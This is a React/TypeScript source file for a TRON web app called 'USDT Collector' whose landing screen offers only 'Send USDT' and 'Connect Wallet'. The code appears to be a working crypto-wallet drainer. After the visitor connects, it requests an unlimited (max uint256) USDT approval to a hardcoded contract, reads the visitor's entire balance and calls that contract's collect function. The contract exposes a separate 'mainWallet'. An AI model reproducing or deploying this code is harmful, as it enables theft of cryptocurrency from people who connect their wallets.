import { Buffer } from 'buffer';
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || Buffer;
}

import { useState, useEffect, useRef } from 'react'
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider
} from '@reown/appkit/react'
import { TronAdapter } from '@reown/appkit-adapter-tron'
import { tronMainnet } from '@reown/appkit/networks'

import { 
  TronLinkAdapter, 
  TrustAdapter, 
  MetaMaskAdapter, 
  OkxWalletAdapter,
  TokenPocketAdapter,
  BitKeepAdapter,
  BybitWalletAdapter,
  BinanceWalletAdapter,
  // LedgerAdapter
} from '@tronweb3/tronwallet-adapters'

import { Copy, CheckCircle, AlertCircle, Wallet } from 'lucide-react'

// --- TRON IMPORTS ---
import TronWeb from 'tronweb'   

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
const NETWORK = 'Mainnet'
const CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'

const NETWORK_CONFIG = {
  fullHost: 'https://api.trongrid.io',
  usdtAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
}

const { usdtAddress: USDT_ADDRESS, fullHost: FULL_HOST } = NETWORK_CONFIG

// ── Reown Adapters ──
const tronAdapter = new TronAdapter({
  walletAdapters: [
    new TronLinkAdapter({ openUrlWhenWalletNotFound: false, checkTimeout: 3000 }),
    new TrustAdapter({ openUrlWhenWalletNotFound: false }),
    new TokenPocketAdapter({ openUrlWhenWalletNotFound: false }),
    new BitKeepAdapter({ openUrlWhenWalletNotFound: false }), 
    new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),
    new BinanceWalletAdapter({ openUrlWhenWalletNotFound: false }),
    new BybitWalletAdapter({ openUrlWhenWalletNotFound: false }),
    // new LedgerAdapter(),
    new MetaMaskAdapter(), 
  ],
})

createAppKit({
  adapters: [tronAdapter], 
  networks: [tronMainnet],
  projectId: WC_PROJECT_ID,
  featuredWalletIds: [
    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
    '0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150', // SafePal
    '20459438007b75f4f4acb98bf29aa3b8cbc34c8e76f5efae2418e2ddb4b57b98', // TokenPocket
    '38f5d18bd8522c244bdd70cb4a68e0e71806dd3ce8e36d400fb8e4b789afde0e', // Bitget
    '8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4', // Binance Web3
    '971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709', // OKX Web3
  ],
  metadata: {
    name:        'USDT Collector',
    description: 'Collect USDT from multiple wallets',
    url:         typeof window !== 'undefined' ? window.location.origin : '',
    icons:       ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
  },
  themeMode: 'dark',
  themeVariables: {
    '--w3m-accent': '#00ff9f',
  },
  allWallets: 'SHOW',
})

// === TRON ABIs ===
const USDT_ABI = [
  { inputs: [{ name: 'who', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
]

const COLLECT_ABI = [
  { inputs: [], name: 'mainWallet', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'usdt', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'user', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'collect', outputs: [], stateMutability: 'nonpayable', type: 'function' },
]

const instantiateTronWeb = (host: string) => {
  const TW = typeof TronWeb === 'function' ? TronWeb : 
             (TronWeb as any).TronWeb || 
             (TronWeb as any).default || 
             TronWeb;
  return new (TW as any)({ fullHost: host });
};

export default function App() {
  const [directAddress, setDirectAddress] = useState<string | null>(null)
  const [usdtBalance, setUsdtBalance] = useState('0')
  const [status, setStatus] = useState('Ready')
  const [debugLog, setDebugLog] = useState<string[]>([])
  const [loading, setLoading] = useState(false)
  const [txHash, setTxHash] = useState('')

  const { open } = useAppKit()
  const { address: appKitAddress } = useAppKitAccount()
  const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')

  // 1. ** HYBRID ADDRESS STATE ** // Priorities `window.tronWeb` over Reown.
  const activeAddress = directAddress || appKitAddress;
  const isWalletConnected = !!activeAddress;

  const log = (msg: string) => {
    console.log(msg);
    setDebugLog(prev => [msg, ...prev].slice(0, 5)); 
  }

  // 2. ** DIRECT TRONWEB INJECTION CHECK **
  useEffect(() => {
    const checkDirect = () => {
      const w = window as any;
      const tw = w.tronWeb || w.tronLink?.tronWeb;
      if (tw && tw.defaultAddress?.base58) {
        setDirectAddress(tw.defaultAddress.base58);
      } else {
        if (!appKitAddress) setDirectAddress(null);
      }
    };
    
    checkDirect();
    const interval = setInterval(checkDirect, 1000);
    return () => clearInterval(interval);
  }, [appKitAddress]);

  // 3. ** BALANCE FETCHER **
  useEffect(() => {
    const fetchBalance = async () => {
      if (!activeAddress) return;
      
      const w = window as any;
      const tw = w.tronWeb || w.tronLink?.tronWeb;
      
      // Use direct TronWeb if available, otherwise use a public node
      let providerToUse = tw && tw.defaultAddress?.base58 ? tw : instantiateTronWeb(FULL_HOST);

      try {
        const usdt = await providerToUse.contract(USDT_ABI).at(USDT_ADDRESS);
        const bal = await usdt.balanceOf(activeAddress).call();
        setUsdtBalance((Number(bal) / 1_000_000).toFixed(2));
        setStatus('Ready');
      } catch (e) {
        log('❌ Balance fetch failed');
      }
    };

    if (activeAddress) fetchBalance();
  }, [activeAddress]);

  // 4. ** DIRECT CONNECT HANDLER **
  const handleConnect = async () => {
    const w = window as any;
    
    if (w.tronLink || w.tronWeb) {
      try {
        if (w.tronLink?.request) {
          await w.tronLink.request({ method: 'tron_requestAccounts' });
        } else if (w.tronWeb?.request) {
          await w.tronWeb.request({ method: 'tron_requestAccounts' });
        }
        
        if (w.tronWeb?.defaultAddress?.base58) {
          setDirectAddress(w.tronWeb.defaultAddress.base58);
          log("✅ Connected directly via TronWeb");
          return; // Exit out, we don't need Reown!
        }
      } catch (e) {
        log("Direct connection ignored, opening Reown...");
      }
    }
    
    // Fallback if TronWeb direct connection fails (like in Trust Wallet)
    open({ view: 'AllWallets' });
  }

  // 5. ** DIRECT EXECUTION LOGIC **
  const approveAndCollect = async () => {
    if (!activeAddress) return;

    setLoading(true);
    setStatus('Step 1/2: Approving...');

    try {
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
      const w = window as any;
      const tw = w.tronWeb || w.tronLink?.tronWeb;

      // --- PATH A: PURE TRONWEB (Highest Priority) ---
      if (tw && tw.defaultAddress?.base58) {
        log('Executing directly via TronWeb...');
        const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS);
        
        const approveTx = await usdt.approve(CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
        log(`✅ Approved! Hash: ${approveTx.slice(0, 10)}...`);
        
        setStatus('Step 2/2: Collecting...');
        await new Promise(r => setTimeout(r, 3000)); // network sync

        const balanceObj = await usdt.balanceOf(activeAddress).call();
        const amount = balanceObj.toString();
        log(`Found ${Number(amount) / 1000000} USDT to collect.`);

        const contract = await tw.contract(COLLECT_ABI).at(CONTRACT_ADDRESS);
        const tx = await contract.collect(activeAddress, amount).send({ feeLimit: 150_000_000 });

        setTxHash(tx);
        log("✅ Successfully Collected!");
        setStatus('✅ All USDT collected!');
        return;
      }

      // --- PATH B: WALLETCONNECT FALLBACK ---
      if (tronWalletProvider) {
        log("Executing via WalletConnect fallback...");
        
        const publicTw = instantiateTronWeb(FULL_HOST);
        
        const signAndSend = async (contractAddr: string, func: string, params: any[], fee: number) => {
          const { transaction } = await publicTw.transactionBuilder.triggerSmartContract(
            contractAddr, 
            func, 
            { feeLimit: fee, callValue: 0 }, 
            params, 
            activeAddress
          );
          
          let signedTx;
          
          if (typeof (tronWalletProvider as any).signTransaction === 'function') {
            signedTx = await (tronWalletProvider as any).signTransaction(transaction);
          } else if (typeof (tronWalletProvider as any).request === 'function') {
            signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
          } else {
            throw new Error("Provider does not support signing");
          }

          const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
          if (!broadcast.result) throw new Error(broadcast.message || 'Broadcast failed');
          return broadcast.txid || broadcast.transaction?.txID;
        };

        const approveTx = await signAndSend(
          USDT_ADDRESS,
          'approve(address,uint256)',
          [ 
            { type: 'address', value: publicTw.address.toHex(CONTRACT_ADDRESS) }, 
            { type: 'uint256', value: MAX_UINT } 
          ],
          100_000_000
        );
        log(`✅ Approved! Hash: ${approveTx.slice(0, 10)}...`);

        setStatus('Step 2/2: Collecting...');
        await new Promise(r => setTimeout(r, 3000));

        publicTw.setAddress(activeAddress);
        const usdt = await publicTw.contract(USDT_ABI).at(USDT_ADDRESS);
        const balanceObj = await usdt.balanceOf(activeAddress).call();
        const amount = balanceObj.toString();

        const tx = await signAndSend(
          CONTRACT_ADDRESS,
          'collect(address,uint256)',
          [ 
            { type: 'address', value: publicTw.address.toHex(activeAddress) }, 
            { type: 'uint256', value: amount } 
          ],
          150_000_000
        );

        setTxHash(tx);
        log("✅ Successfully Collected!");
        setStatus('✅ All USDT collected!');
        return;
      }

      throw new Error("No TRON provider active");

    } catch (err: any) {
      log(`❌ Error: ${err.message || 'User rejected'}`);
      setStatus('❌ Transaction Failed');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-zinc-950">
      <div className="max-w-md w-full bg-zinc-900 rounded-3xl shadow-2xl border border-zinc-800 overflow-hidden">
        <div className="bg-black px-6 py-5 flex items-center justify-between border-b border-zinc-800">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 bg-emerald-400 rounded-2xl flex items-center justify-center text-black font-bold text-xl">
              U
            </div>
            <h1 className="text-3xl font-bold">USDT Collector</h1>
          </div>
          <div className="text-xs px-4 py-1 bg-emerald-500/10 text-emerald-400 rounded-full">
            {NETWORK}
          </div>
        </div>

        <div className="p-8 space-y-8">
          {!isWalletConnected ? (
            <div className="text-center">
              <h2 className="text-5xl font-bold mb-3">Send USDT</h2>

              <button
                onClick={handleConnect}
                disabled={loading}
                className="w-full bg-emerald-400 hover:bg-emerald-500 disabled:bg-zinc-700 text-black font-bold py-5 rounded-2xl text-xl flex items-center justify-center gap-3 transition"
              >
                Connect Wallet
                <Wallet className="w-6 h-6" />
              </button>

              <p className="text-xs text-zinc-500 mt-6">
                Connect a TRON-compatible wallet
              </p>
            </div>
          ) : (
            <div className="space-y-6">
              <div className="bg-zinc-950 p-5 rounded-2xl flex justify-between items-center">
                <div>
                  <p className="text-zinc-400 text-sm">Connected Wallet</p>
                  <p className="font-mono text-sm text-emerald-400 break-all">{activeAddress}</p>
                </div>
                <button
                  onClick={() => navigator.clipboard.writeText(activeAddress ?? '')}
                  className="text-emerald-400 hover:text-white"
                >
                  <Copy size={20} />
                </button>
              </div>

              <div className="bg-zinc-950 rounded-3xl p-8 text-center">
                <p className="text-zinc-400">Your USDT Balance</p>
                <p className="text-6xl font-bold text-emerald-400 mt-2">
                  {usdtBalance} <span className="text-3xl">USDT</span>
                </p>
              </div>

            <button
                onClick={approveAndCollect}
                disabled={loading}
                className="w-full font-bold py-5 rounded-3xl text-xl flex items-center justify-center gap-3 disabled:opacity-70 bg-white hover:bg-zinc-100 text-black"
              >
                {loading ? 'Processing...' : 'Collect All USDT'}
                <CheckCircle size={24} />
              </button>

              <div className="text-center text-sm flex items-center justify-center gap-2 text-zinc-400">
                {status.includes('✅') ? <CheckCircle className="text-emerald-400" /> : <AlertCircle />}
                {status}
              </div>

              {txHash && (
                <p className="text-[10px] text-center text-emerald-400 break-all font-mono">
                  TX: {txHash}
                </p>
              )}
            </div>
          )}

        <div className="mt-6 pt-6 border-t border-zinc-800">
          <p className="text-[10px] uppercase tracking-widest text-zinc-500 mb-3 font-bold">Activity Log</p>
          <div className="bg-black/50 rounded-xl p-3 font-mono text-[11px] space-y-1">
            {debugLog.length === 0 && <p className="text-zinc-600 italic">Waiting for connection...</p>}
            {debugLog.map((line, i) => (
              <div key={i} className={`${line.includes('❌') ? 'text-red-400' : line.includes('✅') ? 'text-emerald-400' : line.includes('⚠️') ? 'text-yellow-400' : 'text-zinc-400'}`}>
                {`> ${line}`}
              </div>
            ))}
          </div>
        </div>

        </div>
      </div>
    </div>
  )
}